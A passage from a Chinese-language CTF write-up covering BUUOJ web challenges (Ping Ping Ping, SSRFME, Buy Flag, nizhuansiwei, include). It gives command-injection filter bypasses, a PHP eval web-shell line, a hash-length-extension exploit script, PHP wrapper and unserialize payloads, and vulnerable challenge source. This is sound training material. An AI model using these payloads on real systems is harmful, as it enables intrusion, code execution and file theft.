class=\"line\">\t\t\techo &quot;&lt;p&gt;[*] query error! (&#123;$mysqli-&gt;error&#125;)&lt;/p&gt;&quot;;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\treturn $res-&gt;fetch_assoc();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function anti_sqli($no) &#123;</span><br><span class=\"line\">\t\t$patterns = &quot;/union\\Wselect|0x|hex/i&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\treturn preg_match($patterns, $no);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\">CREATE TABLE `users` ( `no` INT NOT NULL AUTO_INCREMENT , `username` VARCHAR(100) NOT NULL , `passwd` VARCHAR(128) NOT NULL , `data` TEXT NOT NULL , PRIMARY KEY (`no`)) ENGINE = MyISAM;</span><br><span class=\"line\"></span><br><span class=\"line\"> */</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Ping-Ping-Ping\"><a href=\"#Ping-Ping-Ping\" class=\"headerlink\" title=\"Ping Ping Ping\"></a>Ping Ping Ping</h3><h4 id=\"命令注入\"><a href=\"#命令注入\" class=\"headerlink\" title=\"命令注入\"></a>命令注入</h4><p>先测试什么能用</p>\n<p>过滤<code>&#39; 、&quot; 、 {}、空格、[]、*、?</code>、/</p>\n<p>绕过空格可以 <code>${IFS},$IFS,</code></p>\n<p>这里 <code>$IFS</code> 绕过空格</p>\n<p><code>127.0.0.1;ls$IFS-l</code> 看到 flag.php。 尝试读 <code>127.0.0.1;cat$IFSflag.php</code>,过滤了 <code>flag</code> 关键字，尝试传马</p>\n<p> <code>;echo -e &quot;&lt;?php @eval(\\$_POST[122]);?&gt;&quot; &gt; 233.php</code> </p>\n<p>但是因为过滤了引号，也失败了。现在只能尝试构造关键字 flag 。</p>\n<p>尝试内联执行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">;a=f;b=ag;c=l;cat$IFS$a$c$b.php</span><br></pre></td></tr></table></figure>\n\n<p>这里需要注意定义变量的顺序 <code>acd</code> 就会被检测出含有 flag。</p>\n<p>执行完查看源代码即可。</p>\n<p>还可以编码绕过：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh ==&gt; cat flag.php</span><br></pre></td></tr></table></figure>\n\n<p>参考：</p>\n<p><a href=\"https://blog.csdn.net/silence1_/article/details/96135760\" target=\"_blank\" rel=\"noopener\">命令注入绕过</a></p>\n<h3 id=\"SSRFME\"><a href=\"#SSRFME\" class=\"headerlink\" title=\"SSRFME\"></a>SSRFME</h3><p>源码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#! /usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#encoding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> request</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\">reload(sys)</span><br><span class=\"line\">sys.setdefaultencoding(<span class=\"string\">'latin1'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">secert_key = os.urandom(<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Task</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, action, param, sign, ip)</span>:</span></span><br><span class=\"line\">        self.action = action</span><br><span class=\"line\">        self.param = param</span><br><span class=\"line\">        self.sign = sign</span><br><span class=\"line\">        self.sandbox = md5(ip)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">not</span> os.path.exists(self.sandbox)):          <span class=\"comment\">#SandBox For Remote_Addr</span></span><br><span class=\"line\">            os.mkdir(self.sandbox)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Exec</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        result = &#123;&#125;</span><br><span class=\"line\">        result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.checkSign()):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"scan\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                tmpfile = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'w'</span>)</span><br><span class=\"line\">                resp = scan(self.param)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (resp == <span class=\"string\">\"Connection Timeout\"</span>):</span><br><span class=\"line\">                    result[<span class=\"string\">'data'</span>] = resp</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">print</span> resp</span><br><span class=\"line\">                    tmpfile.write(resp)</span><br><span class=\"line\">                    tmpfile.close()</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"read\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                f = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'r'</span>)</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = f.read()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> result[<span class=\"string\">'code'</span>] == <span class=\"number\">500</span>:</span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = <span class=\"string\">\"Action Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">            result[<span class=\"string\">'msg'</span>] = <span class=\"string\">\"Sign Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">checkSign</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#generate Sign For Action Scan.</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(\"/geneSign\", methods=['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">geneSign</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))</span><br><span class=\"line\">    action = <span class=\"string\">\"scan\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> getSign(action, param)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    action = urllib.unquote(request.cookies.get(<span class=\"string\">\"action\"</span>))</span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))</span><br><span class=\"line\">    sign = urllib.unquote(request.cookies.get(<span class=\"string\">\"sign\"</span>))</span><br><span class=\"line\">    ip = request.remote_addr</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(waf(param)):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"No Hacker!!!!\"</span></span><br><span class=\"line\">    task = Task(action, param, sign, ip)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> json.dumps(task.Exec())</span><br><span class=\"line\"><span class=\"meta\">@app.route('/')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> open(<span class=\"string\">\"code.txt\"</span>,<span class=\"string\">\"r\"</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scan</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    socket.setdefaulttimeout(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urllib.urlopen(param).read()[:<span class=\"number\">50</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"Connection Timeout\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getSign</span><span class=\"params\">(action, param)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5</span><span class=\"params\">(content)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(content).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">waf</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    check=param.strip().lower()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> check.startswith(<span class=\"string\">\"gopher\"</span>) <span class=\"keyword\">or</span> check.startswith(<span class=\"string\">\"file\"</span>):     </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    app.debug = <span class=\"literal\">False</span></span><br><span class=\"line\">    app.run(host=<span class=\"string\">'0.0.0.0'</span>,port=<span class=\"number\">80</span>)</span><br></pre></td></tr></table></figure>\n\n<p>分析代码可知：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/De1ta 从我们传入的url 和 cookie中得到参数 -&gt; waf() 禁用敏感协议 -&gt; Task() -&gt; Exec()</span><br><span class=\"line\"></span><br><span class=\"line\">-&gt; 先检查Sign-checkSign()</span><br><span class=\"line\">     getSign(self.action, self.param) == self.sign</span><br><span class=\"line\">     hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class=\"line\">        </span><br><span class=\"line\">-&gt; 判断动作</span><br><span class=\"line\">\tscan-<span class=\"keyword\">if</span> <span class=\"string\">\"scan\"</span> <span class=\"keyword\">in</span> self.action <span class=\"comment\"># 注意是 in</span></span><br><span class=\"line\">    </span><br><span class=\"line\">       tmpfile = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'w'</span>)</span><br><span class=\"line\">       resp = scan(self.param)</span><br><span class=\"line\">           urllib.urlopen(param).read()[:<span class=\"number\">50</span>]</span><br><span class=\"line\">           <span class=\"keyword\">print</span> resp</span><br><span class=\"line\">           tmpfile.write(resp)</span><br><span class=\"line\">        </span><br><span class=\"line\">\tread-<span class=\"keyword\">if</span> <span class=\"string\">\"read\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">       f = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'r'</span>)</span><br><span class=\"line\">       result[<span class=\"string\">'data'</span>] = f.read()</span><br></pre></td></tr></table></figure>\n\n<p>可以看到我们要先通过 <code>checkSign()</code> 的检查以后才能进行下一步。而在代码中专门给出一个路由，将生成的 Sign 发送给用户，也就是告诉了我们加密的结果。</p>\n<p>于是，我知道了 md5 加密的一个结果，从 <code>hashlib.md5(secert_key + param + action).hexdigest()</code> 以及 <code>secert_key</code> 长度已知，可以使用 <code>hash extend attack</code> 来构造合适的<code>sign</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Input Signature: <span class=\"number\">9</span>f1d78f610b5e32249e30d1161ff4e81</span><br><span class=\"line\">Input Data: local_file:flag.txtscan</span><br><span class=\"line\">Input Key Length: <span class=\"number\">16</span></span><br><span class=\"line\">Input Data to Add: read</span><br><span class=\"line\"><span class=\"number\">4</span>a0fa89f8745038437386ca78367e28d</span><br><span class=\"line\">local_file:flag.txtscan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x008\\x01\\x00\\x00\\x00\\x00\\x00\\x00read</span><br></pre></td></tr></table></figure>\n\n<p>我们注意到要得到文件的内容需要 read in action , 于是我们填充 read 。</p>\n<p>payload.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://a917963c-0d87-4c23-b312-40315cbdd792.node3.buuoj.cn\"</span></span><br><span class=\"line\">s = requests.session()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get Sign</span></span><br><span class=\"line\">route = <span class=\"string\">\"/geneSign\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">re1 = s.get(url + route+<span class=\"string\">\"?param=local_file:flag.txt\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> re1.content, re1.request.headers</span><br><span class=\"line\"></span><br><span class=\"line\">hashs = <span class=\"string\">\"4a0fa89f8745038437386ca78367e28d\"</span></span><br><span class=\"line\">action = <span class=\"string\">\"scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read\"</span></span><br><span class=\"line\"><span class=\"comment\"># action = a.replace(\"\\\\x\", \"%\")</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> action</span><br><span class=\"line\">cookie = &#123;</span><br><span class=\"line\">    <span class=\"string\">\"action\"</span>: action,</span><br><span class=\"line\">    <span class=\"string\">\"sign\"</span>: hashs,</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">route2 = <span class=\"string\">\"/De1ta\"</span></span><br><span class=\"line\">re2 = s.get(url + route2 + <span class=\"string\">\"?param=local_file:flag.txt\"</span>, cookies=cookie)</span><br><span class=\"line\"><span class=\"keyword\">print</span> re2.content</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Buy-Flag\"><a href=\"#Buy-Flag\" class=\"headerlink\" title=\"Buy Flag\"></a>Buy Flag</h3><p>查看源码发现：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">post money <span class=\"keyword\">and</span> password~~~</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'password'</span>])) &#123;</span><br><span class=\"line\">\t$password = $_POST[<span class=\"string\">'password'</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (is_numeric($password)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"password can't be number&lt;/br&gt;\"</span>;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">elseif</span> ($password == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"Password Right!&lt;/br&gt;\"</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>抓包传数据：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/pay.php</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: b1fc07df-c7ae-46e3-8a06-565ab682d9ca.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">DNT</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: user=1</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 28</span><br><span class=\"line\"></span><br><span class=\"line\">money[]00000000&amp;password=404%23</span><br></pre></td></tr></table></figure>\n\n<p>发现身份验证不通过，看到 Cookie ，改成 1 ；绕过 <code>is_numeric</code> 加 </p>\n<p><code>%23</code> ; 传完又提示 money 长度过长，数组绕过。</p>\n<h3 id=\"nizhuansiwei\"><a href=\"#nizhuansiwei\" class=\"headerlink\" title=\"nizhuansiwei\"></a>nizhuansiwei</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">$text = $_GET[<span class=\"string\">\"text\"</span>];</span><br><span class=\"line\">$file = $_GET[<span class=\"string\">\"file\"</span>];</span><br><span class=\"line\">$password = $_GET[<span class=\"string\">\"password\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class=\"string\">'r'</span>)===<span class=\"string\">\"welcome to the zjctf\"</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;&lt;h1&gt;\"</span>.file_get_contents($text,<span class=\"string\">'r'</span>).<span class=\"string\">\"&lt;/h1&gt;&lt;/br&gt;\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/flag/\"</span>,$file))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Not now!\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(); </span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>($file);  <span class=\"comment\">//useless.php</span></span><br><span class=\"line\">        $password = unserialize($password);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))</code> 伪协议post数据： <code>php://input</code> ;</p>\n<p><code>include($file);</code> 这里包含了一个文件并且提示文件名字，我们再用另一个伪协议读一下文件内容：</p>\n<p><code>php://filter/convert.base64-encode/resource=useless.php</code></p>\n<p>*注：只有一个 <code>include()</code> 即可使用伪协议将文件内容包含出来</p>\n<p>将得到内容解密：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Flag</span></span>&#123;  <span class=\"comment\">//flag.php  </span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file;  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span></span>&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;file))&#123;  </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> file_get_contents(<span class=\"keyword\">$this</span>-&gt;file); </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (<span class=\"string\">\"U R SO CLOSE !///COME ON PLZ\"</span>);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>进行序列化：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = <span class=\"keyword\">new</span> Flag();</span><br><span class=\"line\">$a-&gt;file = <span class=\"string\">\"flag.php\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>\n\n<p>现在的 url ：<code>buuoj.cn/?text=php://input&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p>\n<h3 id=\"include\"><a href=\"#include\" class=\"headerlink\" title=\"include\"></a>include</h3><p>伪协议 <code>?file=php://filter/convert.base64-encode/resource=index.php</code> 读一下源码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class=\"line\">&lt;?php</span><br><span 